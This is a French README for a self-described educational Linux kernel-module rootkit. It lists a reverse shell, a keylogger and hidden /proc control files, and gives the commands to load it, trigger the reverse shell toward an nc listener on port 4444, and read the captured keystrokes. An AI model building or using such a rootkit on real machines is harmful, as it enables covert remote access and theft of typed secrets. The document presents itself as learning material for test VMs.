# Rootkit Pédagogique Linux

## 📚 Description

Ce projet est un **rootkit pédagogique** développé sous forme de module noyau Linux (LKM - Loadable Kernel Module). Il est conçu à des fins **d'apprentissage uniquement** pour illustrer des mécanismes comme :

- Injection de commandes dans l’espace utilisateur
- Lancement d’un reverse shell
- Enregistrement des frappes clavier (keylogger)
- Communication avec des fichiers `/proc` personnalisés

> ❗️**Avertissement :** Ce module ne doit jamais être utilisé à des fins malveillantes. Utilisation uniquement sur des environnements de test/VM.

---

## ⚙️ Fonctionnalités

- 📟 **Commande utilisateur** : Exécute des commandes shell depuis le noyau
- 🕵️ **Reverse shell** : Connecte un shell à distance à une IP/port définie
- 🎹 **Keylogger** : Enregistre les frappes clavier via `/proc/keylog`
- 🔐 **Interface `/proc`** :
  - `/proc/rootkit` : Lire/écrire des informations de contrôle
  - `/proc/secret` : Envoyer des commandes au rootkit (`reverse_shell`, `start_keylogger`, etc.)
  - `/proc/keylog` : Lire les touches enregistrées

---

## 📁 Arborescence `/proc`

| Fichier           | Description |
|-------------------|-------------|
| `/proc/rootkit`   | (a implémenter) Interface de contrôle/monitoring |
| `/proc/secret`    | Permet d’envoyer des commandes : `reverse_shell`, `start_keylogger`, `stop_keylogger` |
| `/proc/keylog`    | Lire les frappes clavier enregistrées |

---

## 🧪 Instructions d'installation et de test

### ✅ Prérequis

- Linux avec support des modules (`modprobe`, `insmod`, `rmmod`)
- Paquets nécessaires :
  ```bash
  sudo apt install build-essential linux-headers-$(uname -r)


  ### commandes de test

```  make

2. 📥 Insertion du module
```sudo insmod rootkit.ko
dmesg | tail -n 10
```

3. 🧪 Tests
▶️ Démarrer le reverse shell
```echo "reverse_shell" | sudo tee /proc/secret
```

Il faut s'assurer que dans la vm attaquante soit prêt : 

```nc -lvnp 4444
```

🎹 Démarrer le keylogger
```echo "start_keylogger" | sudo tee /proc/secret
```

il faut ensuite faire quelques frappes clavier puis faire : 

```cat /proc/keylog
```

pour arrêter le kayloggeer, faites : 
```echo "stop_keylogger" | sudo tee /proc/secret
```

4. ❌ Désinstallation

``` sudo rmmod rootkit
```

